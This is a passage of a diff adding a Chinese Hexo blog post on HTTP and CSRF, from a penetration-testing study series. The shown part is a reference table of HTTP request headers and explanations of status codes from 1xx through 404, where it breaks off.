@@ -1,0 +1,1303 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="江霁月的私人小屋" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="江霁月的私人小屋" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="江霁月的私人小屋" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="http://example.com/category/504f59315333.html">
+
+
+
+  <title>
+HTTP&&CSRF - 渗透学习路线 |
+江霁月的私人小屋</title>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">HTTP&&CSRF
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2022-08-30 22:15:30">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-08-30T22:15:30+08:00">2022-08-30</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>21k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>19 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">江霁月的私人小屋</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeybxm1pj20zk0m8niv.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicm0n457cj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/penetration/" itemprop="item" rel="index" title="分类于 渗透学习路线"><span itemprop="name">渗透学习路线</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/category/504f59315333.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="江霁月">
+    <meta itemprop="description" content=", 专注分享一些关于安全运维和编程语言的知识·本博主爱安全,爱折腾,爱代码">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="江霁月的私人小屋">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <ul class="task-list">
+<li class="task-list-item"><input type="checkbox" id="cbx_0" checked="true" disabled="true"><label for="cbx_0"> HTTP 协议</label></li>
+<li class="task-list-item"><input type="checkbox" id="cbx_1" checked="true" disabled="true"><label for="cbx_1"> CSRF 漏洞</label></li>
+<li class="task-list-item"><input type="checkbox" id="cbx_2" checked="true" disabled="true"><label for="cbx_2"> Kali 桌面美化</label></li>
+</ul>
+<h2 id="http协议"><a class="markdownIt-Anchor" href="#http协议">#</a> HTTP 协议</h2>
+<h3 id="请求标记头"><a class="markdownIt-Anchor" href="#请求标记头">#</a> 请求标记头</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">协议头字段名</th>
+<th style="text-align:center">说明</th>
+<th style="text-align:center">示例</th>
+<th style="text-align:center">状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Accept</td>
+<td style="text-align:center">能够接受的回应内容类型（Content-Types）</td>
+<td style="text-align:center"><code>Accept: text/plain</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Accept-Charset</td>
+<td style="text-align:center">能够接受的字符集</td>
+<td style="text-align:center"><code>Accept-Charset: utf-8</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Accept-Encoding</td>
+<td style="text-align:center">能够接受的编码方式列表.</td>
+<td style="text-align:center"><code>Accept-Encoding: gzip, deflate</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Accept-Language</td>
+<td style="text-align:center">能够接受的回应内容的自然语言列表.</td>
+<td style="text-align:center"><code>Accept-Language: en-US</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Accept-Datetime</td>
+<td style="text-align:center">能够接受的按照时间来表示的版本</td>
+<td style="text-align:center"><code>Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</code></td>
+<td style="text-align:center">临时</td>
+</tr>
+<tr>
+<td style="text-align:center">Authorization</td>
+<td style="text-align:center">用于超文本传输协议的认证的认证信息</td>
+<td style="text-align:center"><code>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Cache-Control</td>
+<td style="text-align:center">用来指定在这次的请求 / 响应链中的所有缓存机制 都必须 遵守的指令</td>
+<td style="text-align:center"><code>Cache-Control: no-cache</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Connection</td>
+<td style="text-align:center">该浏览器想要优先使用的连接类型</td>
+<td style="text-align:center"><code>Connection: keep-alive``Connection: Upgrade</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Cookie</td>
+<td style="text-align:center">之前由服务器通过 Set- Cookie （下文详述）发送的一个 超文本传输协议 Cookie</td>
+<td style="text-align:center"><code>Cookie: $Version=1; Skin=new;</code></td>
+<td style="text-align:center">常设：标准</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Length</td>
+<td style="text-align:center">以 八位字节数组 （8 位的字节）表示的请求体的长度</td>
+<td style="text-align:center"><code>Content-Length: 348</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-MD5</td>
+<td style="text-align:center">请求体的内容的二进制 MD5 散列值，以 Base64 编码的结果</td>
+<td style="text-align:center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td>
+<td style="text-align:center">过时的 [<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNSVBNCVCNCVFNSVBRCU5NyVFNiVBRSVCNSNjaXRlX25vdGUtOQ==">9]</span></td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Type</td>
+<td style="text-align:center">请求体的 MIME 类型 （用于 POST 和 PUT 请求中）</td>
+<td style="text-align:center"><code>Content-Type: application/x-www-form-urlencoded</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Date</td>
+<td style="text-align:center">发送该消息的日期和时间 (按照  <code>RFC 7231</code>  中定义的 &quot;超文本传输协议日期&quot; 格式来发送)</td>
+<td style="text-align:center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Expect</td>
+<td style="text-align:center">表明客户端要求服务器做出特定的行为</td>
+<td style="text-align:center"><code>Expect: 100-continue</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">From</td>
+<td style="text-align:center">发起此请求的用户的邮件地址</td>
+<td style="text-align:center"><code>From: user@example.com</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Host</td>
+<td style="text-align:center">服务器的域名 (用于虚拟主机), 以及服务器所监听的 [传输控制协议) 端口号。如果所请求的端口是对应的服务的标准端口，则端口号可被省略。自超文件传输协议版本 1.1（ <code>HTTP/1.1</code> ）开始便是必需字段.</td>
+<td style="text-align:center"><code>Host: zh.fsec.io:80``Host: zh.fsec.io</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">If-Match</td>
+<td style="text-align:center">仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要作用时，用作像  <code>PUT</code>  这样的方法中，仅当从用户上次更新某个资源以来，该资源未被修改的情况下，才更新该资源.</td>
+<td style="text-align:center"><code>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">If-Modified-Since</td>
+<td style="text-align:center">允许在对应的内容未被修改的情况下返回 304 未修改（ <code>304 Not Modified</code>  ）</td>
+<td style="text-align:center"><code>If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">If-None-Match</td>
+<td style="text-align:center">允许在对应的内容未被修改的情况下返回 304 未修改（  <code>304 Not Modified</code>  ）, 参考 超文本传输协议的实体标记</td>
+<td style="text-align:center"><code>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">If-Range</td>
+<td style="text-align:center">如果该实体未被修改过，则向我发送我所缺少的那一个或多个部分；否则，发送整个新的实体</td>
+<td style="text-align:center"><code>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">If-Unmodified-Since</td>
+<td style="text-align:center">仅当该实体自某个特定时间已来未被修改的情况下，才发送回应.</td>
+<td style="text-align:center"><code>If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Max-Forwards</td>
+<td style="text-align:center">限制该消息可被代理及网关转发的次数.</td>
+<td style="text-align:center"><code>Max-Forwards: 10</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Origin</td>
+<td style="text-align:center">发起一个针对 跨来源资源共享 的请求（要求服务器在回应中加入一个‘访问控制 - 允许来源’（’ <code>Access-Control-Allow-Origin</code> ’）字段）.</td>
+<td style="text-align:center"><code>Origin: http://www.example-social-network.com</code></td>
+<td style="text-align:center">常设：标准</td>
+</tr>
+<tr>
+<td style="text-align:center">Pragma</td>
+<td style="text-align:center">与具体的实现相关，这些字段可能在请求 / 回应链中的任何时候产生多种效果.</td>
+<td style="text-align:center"><code>Pragma: no-cache</code></td>
+<td style="text-align:center">常设但不常用</td>
+</tr>
+<tr>
+<td style="text-align:center">Proxy-Authorization</td>
+<td style="text-align:center">用来向代理进行认证的认证信息.</td>
+<td style="text-align:center"><code>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Range</td>
+<td style="text-align:center">仅请求某个实体的一部分。字节偏移以 0 开始。参见字节服务.</td>
+<td style="text-align:center"><code>Range: bytes=500-999</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Referer</td>
+<td style="text-align:center">表示浏览器所访问的前一个页面，正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面.</td>
+<td style="text-align:center"><code>Referer: http://zh.fsec.io/wiki/Main_Page</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">TE</td>
+<td style="text-align:center">浏览器预期接受的传输编码方式：可使用回应协议头 Transfer-Encoding 字段中的值；另外还可用 &quot;trailers&quot;（与 &quot;分块&quot; 传输方式相关）这个值来表明浏览器希望在最后一个尺寸为 0 的块之后还接收到一些额外的字段.</td>
+<td style="text-align:center"><code>TE: trailers, deflate</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">User-Agent</td>
+<td style="text-align:center">浏览器的浏览器身份标识字符串</td>
+<td style="text-align:center"><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Upgrade</td>
+<td style="text-align:center">要求服务器升级到另一个协议.</td>
+<td style="text-align:center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Via</td>
+<td style="text-align:center">向服务器告知，这个请求是由哪些代理发出的.</td>
+<td style="text-align:center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Warning</td>
+<td style="text-align:center">一个一般性的警告，告知，在实体内容体中可能存在错误.</td>
+<td style="text-align:center"><code>Warning: 199 Miscellaneous warning</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+</tbody>
+</table>
+<h3 id="响应状态码"><a class="markdownIt-Anchor" href="#响应状态码">#</a> 响应状态码</h3>
+<h5 id="1xx-消息"><a class="markdownIt-Anchor" href="#1xx-消息">#</a> 1xx 消息</h5>
+<p>这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于 HTTP/1.0 协议中没有定义任何 1xx 状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送 1xx 响应.[<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyU4QSVCNiVFNiU4MCU4MSVFNyVBMCU4MSNjaXRlX25vdGUtMw==">3]</span> 这些状态码代表的响应都是信息性的，标示客户应该等待服务器采取进一步行动.</p>
+<ul>
+<li>
+<p>100 Continue</p>
+<p>服务器已经接收到请求头，并且客户端应继续发送请求主体（在需要发送身体的请求的情况下：例如，POST 请求）, 或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。要使服务器检查请求的头部，客户端必须在其初始请求中发送 <code>Expect: 100-continue</code>  作为头部，并在发送正文之前接收 <code>100 Continue</code>  状态代码。响应代码 417 期望失败表示请求不应继续.</p>
+</li>
+<li>
+<p>101 Switching Protocols</p>
+<p>服务器已经理解了客户端的请求，并将通过 Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在 Upgrade 消息头中定义的那些协议</p>
+<p>只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的 HTTP 版本（如 HTTP/2）比旧版本更有优势，或者切换到一个实时且同步的协议（如 WebSocket）以传送利用此类特性的资源.</p>
+</li>
+<li>
+<p>102 Processing（WebDAV RFC 2518）</p>
+<p>WebDAV 请求可能包含许多涉及文件操作的子请求，需要很长时间才能完成请求。该代码表示服务器已经收到并正在处理请求，但无响应可用.[<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyU4QSVCNiVFNiU4MCU4MSVFNyVBMCU4MSNjaXRlX25vdGUtUkZDXzI1MTgtNQ==">5]</span> 这样可以防止客户端超时，并假设请求丢失.</p>
+</li>
+<li>
+<p>103 Early Hints</p>
+<p>用来在最终的 HTTP 消息之前返回一些响应头.</p>
+</li>
+</ul>
+<h5 id="2xx-成功"><a class="markdownIt-Anchor" href="#2xx-成功">#</a> 2xx 成功</h5>
+<p>这一类型的状态码，代表请求已成功被服务器接收、理解、并接受.</p>
+<ul>
+<li>
+<p>200 OK</p>
+<p>请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在 GET 请求中，响应将包含与请求的资源相对应的实体。在 POST 请求中，响应将包含描述或操作结果的实体.</p>
+</li>
+<li>
+<p>201 Created</p>
+<p>请求已经被实现，而且有一个新的资源已经依据请求的需要而创建，且其 URI 已经随 Location 头信息返回。假如需要的资源无法及时创建的话，应当返回 202 Accepted’.</p>
+</li>
+<li>
+<p>202 Accepted</p>
+<p>服务器已接受请求，但尚未处理。最终该请求可能会也可能不会被执行，并且可能在处理发生时被禁止.</p>
+</li>
+<li>
+<p>203 Non-Authoritative Information（自 HTTP / 1.1 起）</p>
+<p>服务器是一个转换代理服务器（transforming proxy, 例如网络加速器）, 以 <code>200 OK</code>  状态码为起源，但回应了原始响应的修改版本.</p>
+</li>
+<li>
+<p>204 No Content</p>
+<p>服务器成功处理了请求，没有返回任何内容。在强制门户功能中，Wi-Fi 设备连接到需要进行 Web 认证的 Wi-Fi 接入点时，通过访问一个能生成 HTTP 204 响应的的网站，如果能正常收到 204 响应，则代表无需 Web 认证，否则会弹出网页浏览器界面，显示出 Web 网页认证界面用于让用户认证登录.</p>
+</li>
+<li>
+<p>205 Reset Content</p>
+<p>服务器成功处理了请求，但没有返回任何内容。与 204 响应不同，此响应要求请求者重置文档视图.[<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyU4QSVCNiVFNiU4MCU4MSVFNyVBMCU4MSNjaXRlX25vdGUtMTI=">12]</span></p>
+</li>
+<li>
+<p>206 Partial Content RFC 7233</p>
+<p>服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载.</p>
+</li>
+<li>
+<p>207 Multi-Status（WebDAV；RFC 4918</p>
+<p>代表之后的消息体将是一个 XML 消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码.</p>
+</li>
+<li>
+<p>208 Already Reported （WebDAV；RFC 5842）</p>
+<p>DAV 绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含.</p>
+</li>
+<li>
+<p>226 IM Used （RFC 3229）</p>
+<p>服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示.</p>
+</li>
+</ul>
+<h5 id="3xx-重定向"><a class="markdownIt-Anchor" href="#3xx-重定向">#</a> 3xx 重定向</h5>
+<p>这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明.[<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyU4QSVCNiVFNiU4MCU4MSVFNyVBMCU4MSNjaXRlX25vdGUtaWFuYV9zdGF0dXNfY29kZXMtMg==">2]</span></p>
+<p>当且仅当后续的请求所使用的方法是 GET 或者 HEAD 时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A→B→C→……→A 或 A→A）, 因为这会导致服务器和客户端大量不必要的资源消耗。按照 HTTP/1.0 版规范的建议，浏览器不应自动访问超过 5 次的重定向.</p>
+<ul>
+<li>
+<p>300 Multiple Choices</p>
+<p>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向.</p>
+<p>除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616 规范并没有规定这样的自动选择该如何进行.</p>
+<p>如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVVJJ"> URI</span>；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的.</p>
+</li>
+<li>
+<p>301 Moved Permanently</p>
+<p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的.</p>
+<p>新的永久性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明.</p>
+<p>如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化.</p>
+<p>注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个 301 响应的话，接下来的重定向请求将会变成 GET 方式.</p>
+</li>
+<li>
+<p>302 Found</p>
+<p>要求客户端执行临时重定向（原始描述短语为 “Moved Temporarily”）.[<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyU4QSVCNiVFNiU4MCU4MSVFNyVBMCU4MSNjaXRlX25vdGUtUkZDXzE5NDUtMTk=">19]</span> 由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在 Cache-Control 或 Expires 中进行了指定的情况下，这个响应才是可缓存的.</p>
+<p>新的临时性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明.</p>
+<p>如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化.</p>
+<p>注意：虽然 RFC 1945 和 RFC 2068 规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将 302 响应视作为 303 响应，并且使用 GET 方式访问在 Location 中规定的 URI, 而无视原先请求的方法。因此状态码 303 和 307 被添加了进来，用以明确服务器期待客户端进行何种反应.</p>
+</li>
+<li>
+<p>303 See Other</p>
+<p>对应当前请求的响应可以在另一个 URI 上被找到，当响应于 POST（或 PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的 GET 消息发出重定向。这个方法的存在主要是为了允许由脚本激活的 POST 请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303 响应禁止被缓存。当然，第二个请求（重定向）可能被缓存.</p>
+<p>新的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明.</p>
+<p>注意：许多 HTTP/1.1 版以前的浏览器不能正确理解 303 状态。如果需要考虑与这些浏览器之间的互动，302 状态码应该可以胜任，因为大多数的浏览器处理 302 响应时的方式恰恰就是上述规范要求客户端处理 303 响应时应当做的.</p>
+</li>
+<li>
+<p>304 Not Modified</p>
+<p>表示资源在由请求头中的 If-Modified-Since 或 If-None-Match 参数指定的这一版本之后，未曾被修改。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源.</p>
+</li>
+<li>
+<p>305 Use Proxy</p>
+<p>被请求的资源必须通过指定的代理才能被访问.Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能创建 305 响应。许多 HTTP 客户端（像是 Mozilla）和 Internet Explorer）都没有正确处理这种状态代码的响应，主要是出于安全考虑.</p>
+<p>注意：RFC 2068 中没有明确 305 响应是为了重定向一个单独的请求，而且只能被原始服务器创建。忽视这些限制可能导致严重的安全后果.</p>
+</li>
+<li>
+<p>306 Switch Proxy</p>
+<p>在最新版的规范中，306 状态码已经不再被使用。最初是指 “后续请求应使用指定的代理”.</p>
+</li>
+<li>
+<p>307 Temporary Redirect</p>
+<p>在这种情况下，请求应该与另一个 URI 重复，但后续的请求应仍使用原始的 URI. 与 302 相反，当重新发出原始请求时，不允许更改请求方法。例如，应该使用另一个 POST 请求来重复 POST 请求.</p>
+</li>
+<li>
+<p>308 Permanent Redirect (RFC 7538)</p>
+<p>请求和所有将来的请求应该使用另一个 URI 重复. 307 和 308 重复 302 和 301 的行为，但不允许 HTTP 方法更改。例如，将表单提交给永久重定向的资源可能会顺利进行</p>
+</li>
+</ul>
+<h5 id="4xx-客户端错误"><a class="markdownIt-Anchor" href="#4xx-客户端错误">#</a> 4xx 客户端错误</h5>
+<p>这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个 HEAD 请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容.</p>
+<p>如果错误发生时客户端正在传送数据，那么使用 TCP 的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前，客户端已经收到了包含错误信息的 [数据包。如果客户端在收到错误信息后继续向服务器发送数据，服务器的 TCP 栈将向客户端发送一个重置数据包，以清除该客户端所有还未识别的输入缓冲，以免这些数据被服务器上的应用程序读取并干扰后者.</p>
+<ul>
+<li>
+<p>400 Bad Request</p>
+<p>由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求）, 服务器不能或不会处理该请求.</p>
+</li>
+<li>
+<p>401 Unauthorized RFC 7235</p>
+<p>参见：HTTP 基本认证、HTTP 摘要认证</p>
+<p>类似于 403 Forbidden,401 语义即 “未认证”, 即用户没有必要的凭据。该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么 401 响应代表着服务器验证已经拒绝了那些证书。如果 401 响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息.</p>
+<p>注意：当网站（通常是网站域名）禁止 IP 地址时，有些网站状态码显示的 401, 表示该特定地址被拒绝访问网站.</p>
+</li>
+<li>
+<p>402 Payment Required</p>
+<p>该状态码是为了将来可能的需求而预留的。该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分，但几乎没有哪家服务商使用，而且这个状态码通常不被使用。如果特定开发人员已超过请求的每日限制，Google Developers API 会使用此状态码.</p>
+</li>
+<li>
+<p>403 Forbidden</p>
+<p>服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个 404 响应，假如它不希望让客户端获得任何信息.</p>
+</li>
+<li>
+<p>404 Not Found</p>
+<p>请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用 410 状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址.404 这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下.</p>
+</li>
+<li>
